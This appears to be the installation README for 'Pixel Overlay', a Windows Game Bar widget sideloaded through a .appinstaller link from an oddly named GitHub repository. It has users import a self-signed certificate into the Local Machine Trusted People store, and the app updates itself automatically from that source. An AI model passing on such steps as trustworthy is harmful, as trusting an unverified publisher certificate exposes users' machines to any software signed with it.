PIXEL OVERLAY — WINDOWS APP INSTALLER
=====================================

Install
1. Open the official stable App Installer link:
   https://github.com/valenokw2/bobsiwww222zxcv/releases/download/update-channel/PixelOverlay.appinstaller
2. Windows App Installer opens the package page. Select Install (or Update if an older version is installed).
3. Let Windows download the signed Pixel Overlay package and its required x64 framework dependencies.
4. Press Win+G, open Widgets, and select Pixel Overlay.

The .appinstaller file is the only installation entry point. Do not download or run a separate setup EXE. The MSIX and framework packages listed as release assets are downloaded by Windows App Installer automatically.

Publisher certificate
The beta package uses a self-signed Code Signing certificate. If Windows reports that the publisher is not trusted, download PixelOverlay.cer from the same official versioned GitHub Release and import it once:
1. Right-click PixelOverlay.cer and select Install Certificate.
2. Choose Local Machine and approve the administrator prompt.
3. Select Place all certificates in the following store.
4. Choose Trusted People (not Trusted Root Certification Authorities) and finish the wizard.
5. Open the .appinstaller link again.

Only import the certificate from the official repository:
https://github.com/valenokw2/bobsiwww222zxcv/releases

Version handling
- Not installed: Windows App Installer performs a fresh installation.
- Older version installed: App Installer updates the package and preserves application data.
- Same version installed: no package replacement is needed.
- Newer version installed: Windows does not downgrade it.
- Future updates use the same package identity and signing certificate. The stable update manifest is checked on launch and by Windows background update servicing.

Install location
Pixel Overlay is an MSIX app. Windows owns the protected package directory (normally under C:\Program Files\WindowsApps), so an arbitrary installation folder such as D:\Apps\PixelOverlay cannot be selected.
For a new installation, Windows App Installer uses the default app package volume configured in Windows. To change where new apps are stored, use Windows Settings > System > Storage > Advanced storage settings > Where new content is saved > New apps will save to, then start the .appinstaller installation again.
When updating an existing installation, Windows manages the package location and does not move the installed package.

Requirements
- 64-bit Windows 10 version 2004 (build 19041) or later.
- Xbox Game Bar installed and enabled.
- Internet access during installation and update checks.
- Windows App Installer available on the device.

Updates
- Windows checks for updates when the app is launched (at most once every 12 hours).
- An automatic background update task is also registered. Windows schedules these checks periodically when background servicing is available.
- Update checks are controlled by Windows App Installer and may be delayed while the device is offline or the app is in use.
- Users do not need to download a setup program again; updates are delivered through the stable .appinstaller source.

Uninstall
Open Windows Settings > Apps > Installed apps, find Pixel Overlay, and choose Uninstall.
Updating Pixel Overlay keeps its app data. A full uninstall may remove app-local settings and image-library data, so back up anything you want to keep first. The publisher certificate remains in Local Machine > Trusted People until removed separately.

Troubleshooting
- If Windows does not trust the publisher, follow the one-time certificate import steps above.
- If App Installer cannot download the package, confirm that the device is online and that the stable update link opens:
  https://github.com/valenokw2/bobsiwww222zxcv/releases/download/update-channel/PixelOverlay.appinstaller
- If the widget does not appear, confirm Xbox Game Bar is installed and enabled, then press Win+G.
- If the widget list does not refresh, fully close and reopen Xbox Game Bar.
